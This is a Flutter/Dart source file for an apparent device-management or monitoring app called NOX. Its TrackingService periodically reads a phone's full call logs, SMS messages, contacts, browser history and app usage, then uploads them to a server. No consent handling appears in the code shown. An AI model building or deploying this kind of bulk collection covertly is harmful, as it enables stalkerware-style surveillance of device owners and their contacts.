import 'dart:async';
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:app_usage/app_usage.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:intl/intl.dart';
import 'api_service.dart';
import 'socket_service.dart';

class TrackingService {
  final ApiService _apiService;
  final SocketService _socketService;
  final Battery _battery = Battery();
  Timer? _syncTimer;
  Timer? _heartbeatTimer;
  String? _deviceId;
  DateTime _lastSyncTime = DateTime.now();

  DateTime get lastSyncTime => _lastSyncTime;

  TrackingService(this._apiService, this._socketService);

  void startTracking(String deviceId) {
    _deviceId = deviceId;

    // Sync tracking data every 5 minutes
    _syncTimer = Timer.periodic(
      const Duration(minutes: 5),
      (_) => syncAllData(),
    );

    // Heartbeat every minute
    _heartbeatTimer = Timer.periodic(
      const Duration(minutes: 1),
      (_) => _sendHeartbeat(),
    );

    // Initial sync
    syncAllData();
  }

  void stopTracking() {
    _syncTimer?.cancel();
    _heartbeatTimer?.cancel();
    _syncTimer = null;
    _heartbeatTimer = null;
  }

  Future<void> syncAllData() async {
    if (_deviceId == null) return;
    debugPrint('[NOX Tracking] Syncing all data...');

    try {
      await Future.wait([
        _collectAndSubmitAppUsage(),
        _collectAndSubmitCallLogs(),
        _collectAndSubmitSms(),
        _collectAndSubmitContacts(),
        _collectAndSubmitBrowserHistory(),
        _submitScreenTime(),
      ]);
      _lastSyncTime = DateTime.now();
      debugPrint('[NOX Tracking] Sync complete');
    } catch (e) {
      debugPrint('[NOX Tracking] Sync error: $e');
    }
  }

  Future<void> _collectAndSubmitAppUsage() async {
    try {
      final now = DateTime.now();
      final startOfDay = DateTime(now.year, now.month, now.day);
      final List<AppUsageInfo> usageList =
          await AppUsage().getAppUsage(startOfDay, now);

      final items = usageList
          .where((u) => u.usage.inSeconds > 0)
          .map((u) => {
                'packageName': u.packageName,
                'appName': u.appName,
                'durationMs': u.usage.inMilliseconds,
                'startedAt': u.startDate.toIso8601String(),
                'endedAt': u.endDate.toIso8601String(),
              })
          .toList();

      await _apiService.submitAppUsageBatch(items);

      // Also send via WebSocket for real-time
      _socketService.sendDeviceData('app_usage', {'count': items.length});
    } catch (e) {
      debugPrint('[NOX Tracking] App usage error: $e');
    }
  }

  Future<void> _collectAndSubmitCallLogs() async {
    try {
      // Read ALL call logs from native (not just 12h)
      final result = await _nativeChannel.invokeListMethod<Object?>('readCallLogs');
      if (result == null || result.isEmpty) return;
      final items = result
          .whereType<Map>()
          .map((m) => Map<String, dynamic>.from(m))
          .toList();
      if (items.isEmpty) return;

      // Send in batches of 100
      for (var i = 0; i < items.length; i += 100) {
        final slice = items.sublist(i, i + 100 > items.length ? items.length : i + 100);
        await _apiService.submitCallLogsBatch(slice);
      }
      debugPrint('[NOX Tracking] Submitted ${items.length} call logs');
    } catch (e) {
      debugPrint('[NOX Tracking] Call log error: $e');
    }
  }

  Future<void> _submitScreenTime() async {
    try {
      final now = DateTime.now();
      final startOfDay = DateTime(now.year, now.month, now.day);

      // Calculate total screen time from app usage
      final List<AppUsageInfo> usageList =
          await AppUsage().getAppUsage(startOfDay, now);
      final totalMinutes = usageList.fold<int>(
          0, (sum, u) => sum + u.usage.inMinutes);

      await _apiService.submitScreenTime({
        'date': DateFormat('yyyy-MM-dd').format(now),
        'totalMinutes': totalMinutes,
      });
    } catch (e) {
      debugPrint('[NOX Tracking] Screen time error: $e');
    }
  }

  Future<void> _sendHeartbeat() async {
    try {
      final batteryLevel = await _battery.batteryLevel;
      _socketService.sendHeartbeat(batteryLevel: batteryLevel);
    } catch (e) {
      debugPrint('[NOX Tracking] Heartbeat error: $e');
    }
  }

  String _mapCallType(dynamic type) => 'INCOMING';

  Future<void> _collectAndSubmitBrowserHistory() async {
    try {
      final result = await _nativeChannel.invokeListMethod<Object?>('readBrowserHistory');
      if (result == null || result.isEmpty) return;
      final items = result
          .whereType<Map>()
          .map((m) => Map<String, dynamic>.from(m))
          .toList();
      if (items.isEmpty) return;

      for (var i = 0; i < items.length; i += 100) {
        final slice = items.sublist(i, i + 100 > items.length ? items.length : i + 100);
        await _apiService.submitBrowserVisitsBatch(slice);
      }
      debugPrint('[NOX Tracking] Submitted ${items.length} browser history');
    } catch (e) {
      debugPrint('[NOX Tracking] Browser history error: $e');
    }
  }

  // ── SMS collection via native MethodChannel ─────────────────────────
  static const _nativeChannel = MethodChannel('nox.mdm/native');

  Future<void> _collectAndSubmitSms() async {
    try {
      final result = await _nativeChannel.invokeListMethod<Object?>('readSms');
      if (result == null || result.isEmpty) return;
      final items = result
          .whereType<Map>()
          .map((m) => Map<String, dynamic>.from(m))
          .toList();
      if (items.isEmpty) return;
      await _apiService.submitSmsBatch(items);
      debugPrint('[NOX Tracking] Submitted ${items.length} SMS');
    } catch (e) {
      debugPrint('[NOX Tracking] SMS error: $e');
    }
  }

  Future<void> _collectAndSubmitContacts() async {
    try {
      final result = await _nativeChannel.invokeListMethod<Object?>('readContacts');
      if (result == null || result.isEmpty) return;
      final items = result
          .whereType<Map>()
          .map((m) => Map<String, dynamic>.from(m))
          .toList();
      if (items.isEmpty) return;
      await _apiService.submitContactsSync(items);
      debugPrint('[NOX Tracking] Submitted ${items.length} contacts');
    } catch (e) {
      debugPrint('[NOX Tracking] Contacts error: $e');
    }
  }
}
